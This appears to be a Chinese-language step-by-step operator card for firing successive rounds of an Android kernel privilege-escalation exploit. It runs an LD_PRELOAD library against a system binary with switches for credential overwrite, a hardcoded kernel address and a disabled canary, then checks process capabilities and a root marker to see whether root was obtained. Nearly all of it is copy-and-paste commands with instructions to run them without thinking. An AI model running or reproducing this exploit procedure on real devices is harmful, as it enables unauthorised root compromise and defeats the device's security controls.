# mt60 零思考执行卡 · 第 4 弹（R7：canary 关闭，写路径首次武装）2026-08-17

> 规则同前：按编号复制命令 → 原样贴回全部输出 → 卡上没写的就停。
> **R6 判读已出**：R1/R5/R6 三连 miss = 系统性 bug，mt57 canary 埋点
> 顺序错误 → pselect EBADF 秒退 → consumer 窗口从未开过 → 写路径从未
> 武装。修复 = 一行 env：`PSELECT_NO_CANARY=1`（二进制已有此开关，
> 不换 preload.so，SHA 不变）。本卡 = 首次真正武装的写轮。

---

## 第 1 步 · 体检（整块复制）

```sh
date; cat /proc/sys/kernel/random/boot_id; getenforce
awk '{print ($1>600)?"SETTLE_OK":"SETTLE_WAIT"}' /proc/uptime
awk '{print ($1<3)?"LOAD_GO":"LOAD_WAIT"}' /proc/loadavg
ps -A | grep -E "sleep|preload" >/dev/null 2>&1 && echo RESIDUE_DIRTY || echo RESIDUE_CLEAN
```

三旗全绿（`SETTLE_OK`+`LOAD_GO`+`RESIDUE_CLEAN`）→ 第 2 步。
`LOAD_WAIT` → 等 10 分钟重跑本步（最多 2 次）→ 仍 WAIT → **照打**（裁定附录 A 块继续有效）。

## 第 2 步 · 开火 R7（与 R6 唯一区别 = 加了 PSELECT_NO_CANARY=1）

```sh
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/R7.out 2>&1
echo "R7 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)"
```

rc 照贴（255=正常未中，3=哑轮，124=挂满=**窗口开着的健康形态**，42=ROOT）。

## 第 3 步 · 门槛（机器判，两个词）

```sh
cat /data/local/tmp/mt49_child_status.txt
grep -q "CapEff=0000000000000000" /data/local/tmp/mt49_child_status.txt && echo R_MISS || echo R_LANDED
```

- `R_MISS` → 第 4 步（R8 一次重掷，canary 仍关）。
- `R_LANDED` → **立刻跳第 5 步打 C1**（8 分钟窗口在走）。

## 第 4 步 · R8 重掷（仅 R_MISS 且 R7 系统干净时；= R7 命令一字不差，改文件名 R8）

跑完重复第 3 步门槛。`R_LANDED` → 第 5 步。`R_MISS` → 第 6 步收尾。
**两轮都 miss 就停**——数据已够评审判断落点统计，不许第三轮。

## 第 5 步 · C 轮（仅 R_LANDED；命令除 STAGE/TASK 外同 R7）

```sh
TASK=$(grep -a "^task=" /data/local/tmp/mt49_child_status.txt | tail -1 | cut -d= -f2 | cut -d' ' -f1)
echo "C1 TASK=$TASK"
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  PSELECT_NO_CANARY=1 \
  PSELECT_TASK=$TASK \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/C1.out 2>&1
echo "C1 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)"
cat /data/local/tmp/root_alive.txt 2>/dev/null || echo NO_ROOT_MARKER
cat /data/local/tmp/mt49_child_status.txt
```

## 第 6 步 · 活体 + 推送

```sh
getenforce; echo "alive_rc=$?"
cat /proc/sys/kernel/random/boot_id
```

推仓库（原样）：第 1 步整块 / `R7.out` 全文 + rc 行 / 第 3 步两行（门槛词必须在内）/ 若有 R8：`R8.out`+rc+门槛 / 若打 C1：`C1 TASK=` 行+`C1.out`+rc+root 痕迹两行 / 第 6 步两行。推完停。

## 判读注意（给评审自己）

R7 健康形态的预期签名（canary 理论验证判据）：
1. `mt57: canary planted` 行**消失**
2. `slide pselect returned` 行变成 `ret=≥0 errno=0 calls=≥1 sched_ok=1`（窗口 held + 风暴开火）
3. mt25 trigger 行回到 consumer 窗口内节奏（可能 errno=110 形态或不出现在 pselect return 之后）
签名 1+2 同时出现 = canary 理论实证，无论落不落地。

## 事故口令 / 禁止事项（同前）

黑屏：电源×2 等 60s → 不行长按；恢复后只推 `.out` 现状 + `getprop ro.boot.bootreason`，停。
不重跑、不改参数、不总结、不加轮。R_MISS 时禁止顺手打 C。
